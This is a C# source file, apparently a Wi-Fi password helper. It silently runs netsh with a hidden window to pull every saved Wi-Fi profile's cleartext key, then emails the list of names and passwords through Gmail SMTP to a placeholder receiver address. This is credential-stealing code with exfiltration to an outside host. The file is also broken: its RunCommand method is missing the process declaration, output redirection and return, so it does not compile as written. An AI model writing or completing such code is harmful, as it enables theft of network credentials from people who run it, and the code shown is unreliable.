using System.Diagnostics;
using System.Net;
using System.Net.Mail;
using System.Text;

namespace WifiPassword
{
    public class WifiPasswordHelper
    {
        public List<WifiInfo> GetWifiInfo()
        {
            string[] profiles = GetProfiles();
            string[] passwords = GetWifiPasswords(profiles);

            var result = new List<WifiInfo>();
            for (int i = 0; i < profiles.Length; i++)
            {
                result.Add(new WifiInfo
                {
                    Name = profiles[i],
                    Password = passwords[i],
                });
            }

            return result;
        }
        
           public void SendWifiInfoAsEmail(List<WifiInfo> wifiInfo)
        {
            var smtpClient = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,

                DeliveryMethod = SmtpDeliveryMethod.Network,
                                UseDefaultCredentials = false,
                EnableSsl = true,
                Credentials = new NetworkCredential("sender-email", "sender-app-pass")
            };
              
            var message = new MailMessage("sender-email", "receiver-email") {
                Subject = "Wifi Password List",
                Body = ""
            };

            var sb = new StringBuilder();
            foreach (var info in wifiInfo)
            {
                sb.AppendLine($"Name: {info.Name}");
                sb.AppendLine($"Password: {info.Password}");
                sb.AppendLine();
            }
            message.Body = sb.ToString();

            smtpClient.Send(message);
        }

        private static string[] GetWifiPasswords(string[] profiles)
            {
            var passwords = new string[profiles.Length];
            
        for (int i = 0; i < profiles.Length; i++)
            {
                var output = RunCommand("netsh", $"wlan show profile \"{profiles[i]}\" key=clear");
                var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                var passwordLine = lines.FirstOrDefault(line => line.Contains("Key Content            : "));
                if (passwordLine != null)
                {
                    passwords[i] = passwordLine.Trim().Replace("Key Content            : ", "");
                }
            }
            
                 return passwords;
        }

            private static string[] GetProfiles()
            {
                var output = RunCommand("netsh", "wlan show profiles"); //method to be created
                var lines = output.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
                var result = lines.Where(line => line.Contains(" : ")).Select(x => x.Substring(x.IndexOf(":") + 2)).ToArray();
                return result;
            }

            private static string RunCommand(string command, string arguments)
            {
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = command,
                        Arguments = arguments,
                        UseShellExecute = false,
                        CreateNoWindow = true
                    }
                };
            process.Start();
            var output = process.StandardOutput.ReadToEnd();
            
            }
        
    }
}
